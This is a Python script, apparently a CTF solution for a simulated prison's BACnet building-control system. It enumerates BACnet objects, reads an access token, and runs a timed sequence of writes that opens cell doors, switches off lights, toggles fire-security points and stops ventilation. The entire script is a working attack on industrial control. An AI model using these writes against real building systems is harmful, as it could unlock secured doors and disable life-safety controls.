import BAC0
import random
import socket
import requests
from time import sleep
from threading import Timer

LOCAL_IP = "xx.xx.xx.xx" ## FIX HERE: e.g., 192.168.0.42
LOCAL_PORT = random.randint(1024, 65535)

# Check the BAC0 version
assert BAC0.version == "22.9.21"

# Init local BACnet client and send a whois requeast to the target to scan for devices
target = socket.gethostbyname("prison-break.france-cybersecurity-challenge.fr")
bacnet = BAC0.lite(ip = LOCAL_IP, port = LOCAL_PORT)
bacnet.whois(target)

# Result from build_objids
objids = {'porte_nord_1': 1, 'porte_nord_2': 2, 'porte_nord_3': 3, 'porte_nord_4': 4, 'porte_nord_5': 5, 'porte_nord_6': 6, 'porte_nord_7': 7, 'porte_nord_8': 8, 'porte_nord_principale': 9, 'porte_est_1': 10, 'porte_est_2': 11, 'porte_est_3': 12, 'porte_est_4': 13, 'porte_est_5': 14, 'porte_est_6': 15, 'porte_est_7': 16, 'porte_est_8': 17, 'porte_est_9': 18, 'porte_est_10': 19, 'porte_est_11': 20, 'porte_est_12': 21, 'porte_est_principale': 22, 'porte_ouest_1': 23, 'porte_ouest_2': 24, 'porte_ouest_3': 25, 'porte_ouest_4': 26, 'porte_ouest_5': 27, 'porte_ouest_6': 28, 'porte_ouest_7': 29, 'porte_ouest_8': 30, 'porte_ouest_9': 31, 'porte_ouest_10': 32, 'porte_ouest_11': 33, 'porte_ouest_12': 34, 'porte_ouest_principale': 35, 'porte_garde_1': 36, 'porte_garde_2': 37, 'porte_garde_3': 38, 'porte_garde_4': 39, 'porte_garde_5': 40, 'porte_garde_6': 41, 'porte_garde_principale': 42, 'sec_incendie_nord': 43, 'sec_incendie_est': 44, 'sec_incendie_ouest': 45, 'sec_incendie_garde': 46, 'lumiere_nord': 47, 'lumiere_est': 48, 'lumiere_ouest': 49, 'lumiere_garde': 50, 'lumiere_centre': 51, 'ventilation_nord': 1, 'ventilation_est': 2, 'ventilation_ouest': 3, 'ventilation_garde': 4}

def get_objids():
    ids = dict()
    bacnet.whois(target)
    for i in range (1, 52):
        n = bacnet.read(f"{target} binaryValue {i} objectName")
        ids[n] = i
    for i in range (1, 5):
        n = bacnet.read(f"{target} analogValue {i} objectName")
        ids[n] = i
    return ids

def read_token():
    token = bacnet.read(f"{target} characterstringValue 1 description")
    print(f"{token=}")
    return token

def access_scada(token):
    url = "https://prison-break.france-cybersecurity-challenge.fr/" + token
    r = requests.get(url, params=None, proxies=None, allow_redirects=False)

### Check status / Open / Close these: doors, fire security, light
def is_open(n):
    return "inactive" == bacnet.read(f"{target} binaryValue {objids[n]} presentValue")

def close(n):
    print(f"close {n}")
    bacnet.write(f"{target} binaryValue {objids[n]} presentValue inactive")

def open(n):
    print(f"open {n}")
    bacnet.write(f"{target} binaryValue {objids[n]} presentValue active")

### Set value for ventilation
def ventilation(n, v):
    print(f"ventilation {n} {v}")
    bacnet.write(f"{target} analogValue {objids[n]} presentValue {v}")

def step7():
    print("[+] Step 7")
    # control 2: open door
    # main entrance: open doors
    open('porte_garde_3')
    open('porte_garde_5')
    open('porte_garde_6')

def step6bis():
    print("[+] Step 6is")
    # SAS: close doors
    close('porte_garde_1')
    close('porte_garde_principale')

def step6():
    print("[+] Step 6 (15s)")
    timer = Timer(15, step7)
    timer.start()
    # SAS: open fire security
    # Avant-Poste: close lights
    open('sec_incendie_garde')
    close('lumiere_garde')
    timer2 = Timer(8, step6bis)
    timer2.start()

def step5():
    print("[+] Step 5 (5s)")
    timer = Timer(5, step6)
    timer.start()
    # control 2: close door
    close('porte_garde_3')

def step4():
    print("[+] Step 4 (20s)")
    timer = Timer(20, step5)
    timer.start()
    # east ring: close lights
    # center: close lights
    # carlos: open cell
    # east ring: open principal door
    close('lumiere_est')
    close('lumiere_centre')
    open('porte_est_10')
    open('porte_est_principale')

def step3():
    print("[+] Step 3 (5s)")
    timer = Timer(5, step4)
    timer.start()
    # north ring => stop ventilation and close main door
    ventilation('ventilation_nord', 0)
    close('porte_nord_principale')

def step2():
    print("[+] Step 2 (15s)")
    timer = Timer(15, step3)
    timer.start()
    # - west ring  => close main door
    # - north ring => open fire security
    close('porte_ouest_principale')
    open('sec_incendie_nord')

def step1():
    print("[+] Step 1 (15s)")
    timer = Timer(13, step2)
    timer.start()
    # west ring => open all cells & main door
    for i in range(12):
        open(f"porte_ouest_{i+1}")
    open('porte_ouest_principale')

def prison_break():
    step1()

def main():
    token = read_token()
    access_scada(token)
    prison_break()

#print(get_objids())
main()
